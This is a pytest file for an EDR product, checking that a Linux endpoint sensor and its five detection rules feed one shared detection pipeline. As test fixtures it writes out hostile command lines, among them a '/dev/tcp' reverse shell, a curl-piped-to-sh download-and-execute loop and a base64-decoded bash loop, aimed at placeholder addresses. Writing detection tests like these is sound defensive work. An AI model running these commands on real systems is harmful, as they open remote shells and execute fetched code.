"""P0-F · the endpoint plane consumes the authoritative detection fabric.

These tests protect the boundary, not just the behaviour: NivXForge EDR
must contribute an endpoint DSM and Linux detection content and must NOT
grow a second engine, registry, rule model or evidence store.
"""
from __future__ import annotations

import json
import os
import uuid

import pytest

from detection_content.library import REGISTRY
from detection_content.library.rules_edr_linux import (
    EDR_LINUX_DETECTION_RULES)
from detection_content.telemetry.nivxforge_sensor_dsm import (
    NivXForgeSensorDSM)
from detection_content.xdr_pipeline import DSM_REGISTRY, evaluate_detection


def _ep(**proc):
    return {"source_vendor": "NivXForge", "source_product": "LinuxSensor",
            "process": proc}


# ── the boundary ──────────────────────────────────────────────────

def test_endpoint_dsm_is_registered_with_the_one_authoritative_registry():
    ids = [d.id for d in DSM_REGISTRY._dsms]
    assert "nivxforge-linux-sensor" in ids
    assert not DSM_REGISTRY.load_failures()
    # The endpoint DSM is APPENDED: it must not displace the pre-existing
    # resolution order.
    assert ids.index("nivxforge-linux-sensor") == len(ids) - 1


def test_the_dsm_claims_only_real_sensor_events():
    dsm = NivXForgeSensorDSM()
    assert dsm.supports({"activity": "PROCESS",
                         "collection_method": "PROC_POLL"})
    assert dsm.supports({"activity": "NETWORK", "sensor_version": "0.1.0"})
    # A bare dict with an `activity` key is NOT an endpoint event — that
    # would attribute an unrelated source to an endpoint.
    assert not dsm.supports({"activity": "PROCESS"})
    assert not dsm.supports({"activity": "LOGIN",
                             "collection_method": "PROC_POLL"})
    assert not dsm.supports("CEF:0|x|y|1|100|thing|5|")


def test_the_canonical_projection_is_not_duplicated():
    """The DSM parser must delegate to the ONE sensor→canonical projection,
    so a schema change cannot silently diverge between the two paths."""
    from edr_plane.canonical_bridge import parse as bridge_parse
    ev = {"activity": "PROCESS", "operation": "PROCESS_OBSERVED",
          "observed_at": "2026-06-06T10:00:00+00:00", "pid": 4, "ppid": 1,
          "image": "bash", "image_path": "/bin/bash",
          "command_line": "bash -l", "user": "root",
          "collection_method": "PROC_POLL",
          "parent_lookup_state": "PARENT_NOT_PRESENT"}
    dsm_canonical = NivXForgeSensorDSM().select_parser().parse(ev)["canonical"]
    expected = bridge_parse(json.dumps(ev))
    for d in (dsm_canonical, expected):
        d.pop("ingest_time", None)     # the only field that is time-of-call
    assert dsm_canonical == expected


def test_no_second_rule_model_or_registry_exists():
    for r in EDR_LINUX_DETECTION_RULES:
        # Same class the enterprise pack uses — not an EDR-specific model.
        assert type(r).__name__ == "DetectionRuleContent"
        assert type(r).__module__.endswith("detection_content.library.models")
    # Evaluated by the same registry that serves every other source.
    assert REGISTRY.get_rule("EDR-LNX-001") is not None


def test_normalizer_refuses_to_invent_a_tenant():
    n = NivXForgeSensorDSM().select_normalizer()
    parsed = {"canonical": {"additional_fields": {}}}
    with pytest.raises(ValueError):
        n.normalize(parsed, "dsm", "c", "i", "t", tenant_id="")


# ── the Linux pack ────────────────────────────────────────────────

def test_every_linux_rule_has_positive_and_negative_evidence():
    assert len(EDR_LINUX_DETECTION_RULES) == 5
    for r in EDR_LINUX_DETECTION_RULES:
        assert r.platform.value.lower() == "linux"
        assert r.rule_id.startswith("EDR-LNX-")
        assert r.mitre_attack, f"{r.rule_id} claims no technique"
        assert r.telemetry_requirements, f"{r.rule_id} states no evidence"
        assert r.false_positive_notes
        assert any(f.should_match for f in r.fixtures), r.rule_id
        assert any(not f.should_match for f in r.fixtures), r.rule_id


def test_linux_rule_fixtures_all_hold():
    for r in EDR_LINUX_DETECTION_RULES:
        for f in r.fixtures:
            assert r.evaluate(f.event) is f.should_match, \
                f"{r.rule_id} · {f.name}"


def test_the_real_shapes_observed_on_this_host_are_detected():
    """The exact command lines the acceptance proof executed for real."""
    cases = {
        "EDR-LNX-001": _ep(executable_path="/usr/bin/bash",
                           command_line="/bin/bash -c while :; do echo "
                                        "c2xlZXAgMg== | base64 -d | bash; "
                                        "done"),
        "EDR-LNX-002": _ep(executable_path="/usr/bin/dash",
                           command_line="/bin/sh /tmp/p0f/payload.sh"),
        "EDR-LNX-003": _ep(executable_path="/usr/bin/bash",
                           command_line="/bin/bash -c while :; do curl -s "
                                        "http://127.0.0.1:1/a.sh | sh; "
                                        "sleep 3; done"),
        "EDR-LNX-004": _ep(executable_path="/usr/bin/bash",
                           command_line="/bin/bash -c while :; do exec "
                                        "3<>/dev/tcp/127.0.0.1/9; sleep 5; "
                                        "done"),
        "EDR-LNX-005": _ep(executable_path="/usr/bin/bash",
                           command_line="/bin/bash -c while :; do chmod +x "
                                        "/tmp/p0f/payload.sh; sleep 2; done"),
    }
    for rule_id, ev in cases.items():
        fired = [d["rule_id"] for d in evaluate_detection(ev)["detections"]]
        assert rule_id in fired, f"{rule_id} did not fire on real shape"


def test_the_benign_controls_stay_benign():
    for cmd, image in (("sleep 95", "/bin/sleep"),
                       ("/bin/sleep 95", "/bin/sleep"),
                       ("ls -la /home", "/bin/ls"),
                       ("cat /tmp/notes.txt", "/usr/bin/cat"),
                       ("curl -o /tmp/a.sh http://x/a.sh", "/usr/bin/curl"),
                       ("base64 /etc/hostname", "/usr/bin/base64"),
                       ("python3 /opt/app/main.py", "/usr/bin/python3")):
        ev = _ep(executable_path=image, command_line=cmd)
        fired = [d["rule_id"] for d in evaluate_detection(ev)["detections"]
                 if d["rule_id"].startswith("EDR-LNX")]
        assert not fired, f"false positive on `{cmd}`: {fired}"


def test_absent_evidence_never_matches():
    """Missing telemetry is not benign — but it is also not a detection.
    A rule must not fire on a command line that was never observed."""
    for proc in ({}, {"executable_path": "/usr/bin/bash"},
                 {"command_line": None, "executable_path": "/usr/bin/bash"}):
        fired = [d["rule_id"] for d in evaluate_detection(_ep(**proc))
                 ["detections"] if d["rule_id"].startswith("EDR-LNX")]
        assert not fired


def test_a_non_endpoint_source_is_never_judged_by_a_linux_rule():
    ev = {"source_vendor": "Microsoft", "source_product": "Windows Security",
          "process": {"executable_path": "/usr/bin/bash",
                      "command_line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}}
    fired = [d["rule_id"] for d in evaluate_detection(ev)["detections"]
             if d["rule_id"].startswith("EDR-LNX")]
    assert not fired


# ── the wire ──────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_real_endpoint_event_traverses_the_existing_pipeline():
    from motor.motor_asyncio import AsyncIOMotorClient
    from detection_content.xdr_pipeline import process_event_through_pipeline
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    tenant = f"p0f-{uuid.uuid4().hex[:8]}"
    ev = {"activity": "PROCESS", "operation": "PROCESS_OBSERVED",
          "observed_at": "2026-06-06T10:00:00+00:00", "pid": 9, "ppid": 1,
          "image": "bash", "image_path": "/usr/bin/bash",
          "command_line": "/bin/bash -c curl -s http://x/a.sh | sh",
          "user": "root", "collection_method": "PROC_POLL",
          "sensor_version": "0.1.0", "parent_lookup_state": "OBSERVED",
          "parent_image": "sshd", "not_observed": []}
    try:
        out = await process_event_through_pipeline(
            db, ev, trace_id=f"raw_{uuid.uuid4().hex[:20]}",
            integration_id="nivxforge-linux-sensor",
            collector_id="ep_test", tenant_id=tenant)
        stages = [s["stage"] for s in out["stages"]]
        # The endpoint event must traverse the SAME stages, in order, with
        # no EDR shortcut around canonicalisation or reasoning.
        for expected in ("dsm", "parser", "normalizer", "canonical_evidence",
                         "detection", "iue", "correlation", "verdict",
                         "incident"):
            assert expected in stages, f"{expected} was bypassed"
        assert out["detection"]["matched"] is True
        assert "EDR-LNX-003" in [d["rule_id"]
                                 for d in out["detection"]["detections"]]
        # Provenance survives to the persisted canonical evidence.
        doc = await db["xdr_canonical_evidence"].find_one(
            {"tenant_id": tenant})
        assert doc["provenance"]["collector_id"] == "ep_test"
        assert doc["provenance"]["dsm_id"] == "nivxforge-linux-sensor"
        # Promotion is the gate's decision, never the detection's.
        assert "created" in out["incident"]
    finally:
        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
        client.close()


@pytest.mark.asyncio
async def test_bridge_records_the_detection_outcome_on_the_raw_event():
    from motor.motor_asyncio import AsyncIOMotorClient
    from edr_plane.canonical_bridge import bridge
    from edr_plane.raw_events import (COLLECTION, RawEndpointEvent, append,
                                      ensure_indexes, get)
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    tenant = f"p0f-{uuid.uuid4().hex[:8]}"
    payload = json.dumps({
        "activity": "PROCESS", "operation": "PROCESS_OBSERVED",
        "observed_at": "2026-06-06T11:00:00+00:00", "start_time": "s1",
        "pid": 11, "ppid": 1, "image": "bash", "image_path": "/usr/bin/bash",
        "command_line": "/bin/bash -c exec 3<>/dev/tcp/198.51.100.9/4444",
        "user": "root", "collection_method": "PROC_POLL",
        "parent_lookup_state": "PARENT_NOT_PRESENT"})
    try:
        await ensure_indexes(db)
        ev = RawEndpointEvent.build(tenant_id=tenant, source="ep_f",
                                    payload=payload,
                                    trust_state="AUTHENTICATED")
        await append(db, ev)
        out = await bridge(db, raw_id=ev.raw_id, tenant_id=tenant,
                           payload=payload, endpoint_id="ep_f",
                           hostname="lab-01",
                           authentication={"authenticated_endpoint_id":
                                           "ep_f"})
        det = out["detection"]
        assert det["evaluated"] is True, det
        assert "EDR-LNX-004" in det["rule_ids"]
        outcomes = [d["outcome"] for d in
                    (await get(db, tenant_id=tenant,
                               raw_id=ev.raw_id))["derivations"]]
        # Both facts are recorded: evidence was created AND the fabric
        # judged it. Neither is inferred from the other.
        assert "CANONICAL_EVIDENCE_CREATED" in outcomes
        assert "DETECTION_MATCHED" in outcomes
    finally:
        await db[COLLECTION].delete_many({"tenant_id": tenant})
        await db["v2_shadow_observations"].delete_many({"tenant_id": tenant})
        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
        client.close()


@pytest.mark.asyncio
async def test_a_detection_fault_never_destroys_the_evidence_record():
    """If the fabric cannot be reached, canonical evidence must still exist
    and the gap must be stated — a detection gap is not a clean endpoint."""
    from unittest.mock import patch
    from motor.motor_asyncio import AsyncIOMotorClient
    from edr_plane.canonical_bridge import bridge
    from edr_plane.raw_events import (COLLECTION, RawEndpointEvent, append,
                                      ensure_indexes, get)
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    db = client[os.environ["DB_NAME"]]
    tenant = f"p0f-{uuid.uuid4().hex[:8]}"
    payload = json.dumps({
        "activity": "PROCESS", "operation": "PROCESS_OBSERVED",
        "observed_at": "2026-06-06T12:00:00+00:00", "start_time": "s2",
        "pid": 12, "ppid": 1, "image": "ls", "image_path": "/bin/ls",
        "command_line": "ls -la", "user": "root",
        "collection_method": "PROC_POLL",
        "parent_lookup_state": "PARENT_NOT_PRESENT"})
    try:
        await ensure_indexes(db)
        ev = RawEndpointEvent.build(tenant_id=tenant, source="ep_g",
                                    payload=payload,
                                    trust_state="AUTHENTICATED")
        await append(db, ev)
        with patch("detection_content.xdr_pipeline."
                   "process_event_through_pipeline",
                   side_effect=RuntimeError("fabric unreachable")):
            out = await bridge(db, raw_id=ev.raw_id, tenant_id=tenant,
                               payload=payload, endpoint_id="ep_g",
                               hostname="lab-01", authentication={})
        assert out["canonicalized"] is True
        assert out["detection"]["evaluated"] is False
        d = [x for x in (await get(db, tenant_id=tenant,
                                   raw_id=ev.raw_id))["derivations"]
             if x["outcome"] == "DETECTION_NOT_EVALUATED"]
        assert d and "detection gap" in d[0]["reason"]
    finally:
        await db[COLLECTION].delete_many({"tenant_id": tenant})
        await db["v2_shadow_observations"].delete_many({"tenant_id": tenant})
        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
        client.close()
